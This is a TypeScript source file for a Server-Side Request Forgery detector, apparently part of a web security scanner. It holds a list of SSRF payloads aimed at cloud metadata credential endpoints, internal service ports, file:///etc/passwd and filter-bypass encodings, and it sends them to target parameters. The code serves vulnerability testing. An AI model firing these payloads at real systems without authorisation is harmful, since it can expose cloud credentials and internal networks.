/**
 * SSRF (Server-Side Request Forgery) Detector
 * 
 * Tests URL parameters for internal network access,
 * cloud metadata endpoints, and DNS rebinding attacks.
 */

import { BaseDetector } from '../base/BaseDetector';
import {
    DetectorResult,
    AttackSurface,
    PlatformDetectionResult,
    Parameter,
    Endpoint
} from '../../types';
import { logger } from '../../core/Logger';

export class SSRFDetector extends BaseDetector {
    // Internal/dangerous URLs to test
    private readonly testUrls = [
        // Localhost variants
        'http://localhost',
        'http://127.0.0.1',
        'http://[::1]',
        'http://0.0.0.0',
        'http://0',
        'http://127.1',
        'http://127.0.0.1.nip.io',

        // Cloud metadata (AWS)
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/user-data/',
        'http://169.254.169.254/latest/api/token',

        // Cloud metadata (GCP)
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://169.254.169.254/computeMetadata/v1/',

        // Cloud metadata (Azure)
        'http://169.254.169.254/metadata/instance',

        // Cloud metadata (DigitalOcean)
        'http://169.254.169.254/metadata/v1/',

        // Private IP ranges
        'http://10.0.0.1',
        'http://172.16.0.1',
        'http://192.168.0.1',
        'http://192.168.1.1',

        // Common internal services
        'http://localhost:22',  // SSH
        'http://localhost:3306', // MySQL
        'http://localhost:5432', // PostgreSQL
        'http://localhost:6379', // Redis
        'http://localhost:27017', // MongoDB
        'http://localhost:9200', // Elasticsearch
        'http://localhost:11211', // Memcached

        // File protocol
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',

        // Bypass attempts
        'http://127.0.0.1#@evil.com',
        'http://evil.com#@127.0.0.1',
        'http://127。0。0。1', // Unicode dots
    ];

    constructor() {
        super('ssrf', 'injection');
    }

    async test(
        attackSurface: AttackSurface,
        platform: PlatformDetectionResult
    ): Promise<DetectorResult[]> {
        const findings: DetectorResult[] = [];
        const urlParams = this.getRelevantParameters(attackSurface);

        this.log('Starting SSRF detection', { paramCount: urlParams.length });

        for (const param of urlParams) {
            const endpoints = this.getEndpointsWithParam(attackSurface, param.name);

            for (const endpoint of endpoints) {
                // Test each SSRF payload
                for (const targetUrl of this.testUrls) {
                    const result = await this.testSSRF(endpoint, param, targetUrl);
                    if (result) {
                        findings.push(result);
                        break; // Found SSRF, skip other payloads
                    }
                }

                // Test URL encoding bypasses
                const bypassResult = await this.testBypassTechniques(endpoint, param);
                if (bypassResult) findings.push(bypassResult);
            }
        }

        // Test for blind SSRF via timing
        const blindResults = await this.testBlindSSRF(attackSurface, urlParams);
        findings.push(...blindResults);

        return findings;
    }

    protected getRelevantParameters(attackSurface: AttackSurface): Parameter[] {
        const urlPatterns = /url|uri|link|redirect|callback|webhook|image|src|href|file|path|fetch|load|get|download/i;

        return attackSurface.parameters
            .map(ap => ap.parameter)
            .filter(p => urlPatterns.test(p.name) || this.looksLikeUrl(p.value));
    }

    private getEndpointsWithParam(attackSurface: AttackSurface, paramName: string): Endpoint[] {
        return attackSurface.endpoints
            .map(ae => ae.endpoint)
            .filter(e => e.parameters.some(p => p.name === paramName));
    }

    private looksLikeUrl(value: unknown): boolean {
        const str = String(value);
        return /^https?:\/\//.test(str) || /\.(com|org|net|io)/.test(str);
    }

    /**
     * Test for SSRF vulnerability
     */
    private async testSSRF(
        endpoint: Endpoint,
        param: Parameter,
        targetUrl: string
    ): Promise<DetectorResult | null> {
        try {
            const response = await this.sendRequest({
                method: endpoint.method,
                url: endpoint.url,
                headers: endpoint.headers,
                data: { [param.name]: targetUrl }
            });

            // Check for signs of successful SSRF
            if (this.detectSSRFSuccess(response.body, targetUrl)) {
                const severity = this.determineSeverity(targetUrl);

                return this.createResult('ssrf', true, severity, {
                    parameter: param.name,
                    endpoint: endpoint.url,
                    originalValue: param.value,
                    exploitValue: targetUrl,
                    evidence: this.getEvidence(response.body, targetUrl),
                    impact: this.getImpact(targetUrl),
                    confidence: 0.85
                });
            }

            // Check for cloud metadata indicators
            if (this.isCloudMetadata(targetUrl) && this.detectMetadataResponse(response.body)) {
                return this.createResult('ssrf_cloud_metadata', true, 'CRITICAL', {
                    parameter: param.name,
                    endpoint: endpoint.url,
                    exploitValue: targetUrl,
                    evidence: ['Cloud metadata endpoint accessible', response.body.substring(0, 200)],
                    impact: 'Access to cloud instance credentials and sensitive configuration',
                    confidence: 0.95
                });
            }

        } catch (error) {
            // Connection errors to internal IPs might indicate partial SSRF
            const errorMsg = error instanceof Error ? error.message : '';
            if (this.isInternalTarget(targetUrl) &&
                (errorMsg.includes('ECONNREFUSED') || errorMsg.includes('ETIMEDOUT'))) {
                // Server tried to connect = SSRF exists but target not listening
                return this.createResult('ssrf_connection_attempt', true, 'MEDIUM', {
                    parameter: param.name,
                    endpoint: endpoint.url,
                    exploitValue: targetUrl,
                    evidence: ['Server attempted internal connection (connection refused/timeout)'],
                    impact: 'Server can be used to probe internal network',
                    confidence: 0.6
                });
            }
        }

        return null;
    }

    /**
     * Test URL encoding and other bypass techniques
     */
    private async testBypassTechniques(
        endpoint: Endpoint,
        param: Parameter
    ): Promise<DetectorResult | null> {
        const bypasses = [
            // URL encoding
            'http://127.0.0.1%00@evil.com',
            'http://127%2e0%2e0%2e1',
            // IP address alternatives
            'http://2130706433',  // Decimal IP for 127.0.0.1
            'http://0x7f000001',  // Hex IP
            'http://0177.0.0.1',  // Octal
            // Unicode normalization
            'http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ',
            // DNS rebinding prep
            'http://localtest.me',
            'http://127.0.0.1.xip.io',
        ];

        for (const bypass of bypasses) {
            try {
                const response = await this.sendRequest({
                    method: endpoint.method,
                    url: endpoint.url,
                    headers: endpoint.headers,
                    data: { [param.name]: bypass }
                });

                if (this.detectInternalAccess(response.body)) {
                    return this.createResult('ssrf_bypass', true, 'HIGH', {
                        parameter: param.name,
                        endpoint: endpoint.url,
                        exploitValue: bypass,
                        evidence: ['URL validation bypass successful'],
                        impact: 'URL blocklist can be bypassed',
                        confidence: 0.8
                    });
                }
            } catch {
                // Continue
            }
        }

        return null;
    }

    /**
     * Test for blind SSRF using timing analysis
     */
    private async testBlindSSRF(
        attackSurface: AttackSurface,
        urlParams: Parameter[]
    ): Promise<DetectorResult[]> {
        const findings: DetectorResult[] = [];

        for (const param of urlParams) {
            const endpoints = this.getEndpointsWithParam(attackSurface, param.name);

            for (const endpoint of endpoints) {
                // Test timing difference between internal and external URLs
                const internalStart = Date.now();
                try {
                    await this.sendRequest({
                        method: endpoint.method,
                        url: endpoint.url,
                        headers: endpoint.headers,
                        data: { [param.name]: 'http://10.255.255.1:8080' } // Non-routable
                    });
                } catch {
                    // Expected to fail
                }
                const internalTime = Date.now() - internalStart;

                const externalStart = Date.now();
                try {
                    await this.sendRequest({
                        method: endpoint.method,
                        url: endpoint.url,
                        headers: endpoint.headers,
                        data: { [param.name]: 'http://example.com' }
                    });
                } catch {
                    // May fail
                }
                const externalTime = Date.now() - externalStart;

                // Significant timing difference suggests server is making requests
                if (Math.abs(internalTime - externalTime) > 2000) {
                    findings.push(this.createResult('blind_ssrf_timing', true, 'MEDIUM', {
                        parameter: param.name,
                        endpoint: endpoint.url,
                        evidence: [
                            `Internal URL timing: ${internalTime}ms`,
                            `External URL timing: ${externalTime}ms`,
                            'Timing difference suggests server-side request execution'
                        ],
                        impact: 'Blind SSRF - server makes requests to provided URLs',
                        confidence: 0.6
                    }));
                }
            }
        }

        return findings;
    }

    /**
     * Detect if response contains internal/sensitive data
     */
    private detectSSRFSuccess(body: string, targetUrl: string): boolean {
        // File content indicators
        if (targetUrl.includes('passwd') && body.includes('root:')) return true;
        if (targetUrl.includes('win.ini') && body.includes('[extensions]')) return true;

        // Internal service responses
        if (body.includes('Redis') || body.includes('PONG')) return true;
        if (body.includes('MongoDB') || body.includes('ismaster')) return true;

        // HTML from internal pages
        if (body.includes('localhost') || body.includes('127.0.0.1')) return true;

        return false;
    }

    /**
     * Detect cloud metadata response
     */
    private detectMetadataResponse(body: string): boolean {
        const metadataIndicators = [
            'ami-id', 'instance-id', 'security-credentials',
            'iam', 'computeMetadata', 'serviceAccounts',
            'access-token', 'instance/attributes'
        ];

        return metadataIndicators.some(ind => body.includes(ind));
    }

    /**
     * Detect internal access based on response
     */
    private detectInternalAccess(body: string): boolean {
        return /127\.0\.0\.1|localhost|internal|private/i.test(body);
    }

    private isCloudMetadata(url: string): boolean {
        return url.includes('169.254.169.254') ||
            url.includes('metadata.google.internal');
    }

    private isInternalTarget(url: string): boolean {
        return /localhost|127\.|10\.|172\.1[6-9]\.|172\.2[0-9]\.|172\.3[0-1]\.|192\.168\./.test(url);
    }

    private determineSeverity(targetUrl: string): 'CRITICAL' | 'HIGH' | 'MEDIUM' {
        if (this.isCloudMetadata(targetUrl)) return 'CRITICAL';
        if (targetUrl.includes('file://')) return 'CRITICAL';
        if (this.isInternalTarget(targetUrl)) return 'HIGH';
        return 'MEDIUM';
    }

    private getEvidence(body: string, targetUrl: string): string[] {
        const evidence = [`Successfully accessed: ${targetUrl}`];
        if (body.length > 0) {
            evidence.push(`Response preview: ${body.substring(0, 100)}...`);
        }
        return evidence;
    }

    private getImpact(targetUrl: string): string {
        if (this.isCloudMetadata(targetUrl)) {
            return 'Access to cloud instance credentials, potentially full account compromise';
        }
        if (targetUrl.includes('file://')) {
            return 'Local file read - potential access to sensitive configuration and secrets';
        }
        if (this.isInternalTarget(targetUrl)) {
            return 'Internal network access - can scan and attack internal services';
        }
        return 'Server can be used to make requests to arbitrary URLs';
    }
}
